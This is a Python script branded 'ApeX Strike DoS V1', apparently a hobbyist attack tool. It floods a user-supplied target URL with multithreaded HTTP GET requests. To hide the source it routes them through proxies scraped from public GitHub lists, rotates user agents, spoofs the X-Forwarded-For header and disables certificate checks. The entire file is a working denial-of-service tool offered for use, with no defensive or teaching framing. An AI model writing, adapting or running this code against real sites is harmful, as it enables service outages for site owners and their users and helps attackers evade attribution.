#!/usr/bin/env python3
import os
import sys
import time
import random
import string
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

os.system("title ApeX Strike DoS V1")

# Simple user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
]

# Quick proxy sources (mobile friendly)
PROXY_URLS = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
]

# Load proxies
print("[+] Loading proxies...")
proxies = []

for url in PROXY_URLS:
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            for line in r.text.splitlines():
                line = line.strip()
                if ':' in line and line.count('.') == 3:
                    proxies.append(line)
    except:
        pass

# Remove duplicates
proxies = list(set(proxies))
print(f"[+] Loaded {len(proxies)} proxies")

# Generate fake IPs if no proxies
if not proxies:
    proxies = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}:8080" for _ in range(500)]
    print(f"[+] Generated {len(proxies)} fake IPs")

# Attack vars
total = 0
success = 0
fail = 0
running = True
lock = threading.Lock()

def print_banner():
    print("""
                    -@                
                   .##@               
                  .####@              
                  @#####@             
                . *######@            
               .##@o@#####@           
              /############@          
             /##############@         
            @######@**%######@        
           @######`     %#####o       
          @######@       ######%      
        -@#######h       ######@.`    
       /#####h**``       `**%@####@   
      @H@*`                    `*%#@  
     *`                            `* 
      ApeX Strike 
        DoS V1
       __________________
      /                  \
      \   Developed by   /
       \    venex47_    /
      \______________/
    """)

def attack_worker(url):
    global total, success, fail, running
    
    while running:
        try:
            # Pick random proxy
            proxy = random.choice(proxies)
            proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            
            # Random headers
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'X-Forwarded-For': proxy.split(':')[0],
                'Accept': random.choice(['text/html', 'application/json', '*/*']),
                'Accept-Language': random.choice(['en-US', 'en', 'pl', 'de', 'fr']),
                'Cache-Control': 'no-cache',
                'Connection': 'close',
            }
            
            # Send request
            r = requests.get(url, headers=headers, proxies=proxy_dict, timeout=3, verify=False)
            
            with lock:
                total += 1
                if r.status_code < 400:
                    success += 1
                else:
                    fail += 1
                
                # Show status every 10 requests (mobile friendly)
                if total % 10 == 0:
                    sys.stdout.write(f"\r[🔥] Sent: {total} | Success: {success} | Fail: {fail} | Last: {r.status_code}")
                    sys.stdout.flush()
                    
        except Exception as e:
            with lock:
                total += 1
                fail += 1
                if total % 10 == 0:
                    sys.stdout.write(f"\r[🔥] Sent: {total} | Success: {success} | Fail: {fail} | Last: TIMEOUT")
                    sys.stdout.flush()
            continue

def main():
    print_banner()
    
    # Get target
    target_url = input("\nEnter Target URL: ").strip()
    if not target_url:
        print("Error: URL cannot be empty!")
        return
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Get number of requests
    try:
        num_requests = int(input("Enter Number of Requests: ").strip())
        if num_requests <= 0:
            print("Error: Number must be positive!")
            return
    except ValueError:
        print("Error: Invalid number!")
        return
    
    # Thread count (mobile optimized)
    thread_count = 50  # Lower for mobile
    
    print(f"\n[🔥] Attacking {target_url}")
    print(f"[+] Requests: {num_requests}")
    print(f"[+] Threads: {thread_count}")
    print(f"[+] Press Ctrl+C to stop\n")
    
    global running
    running = True
    
    # Start attack threads
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(attack_worker, target_url) for _ in range(thread_count)]
        
        # Monitor progress
        try:
            while running and total < num_requests:
                time.sleep(1)
                if total >= num_requests:
                    break
        except KeyboardInterrupt:
            print("\n\n[!] Attack stopped by user")
            running = False
    
    # Final stats
    print(f"\n\n{'='*50}")
    print(f"[✓] Attack completed!")
    print(f"[+] Total requests: {total}")
    print(f"[+] Successful: {success}")
    print(f"[+] Failed: {fail}")
    if total > 0:
        print(f"[+] Success rate: {(success/total)*100:.1f}%")
    print(f"{'='*50}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
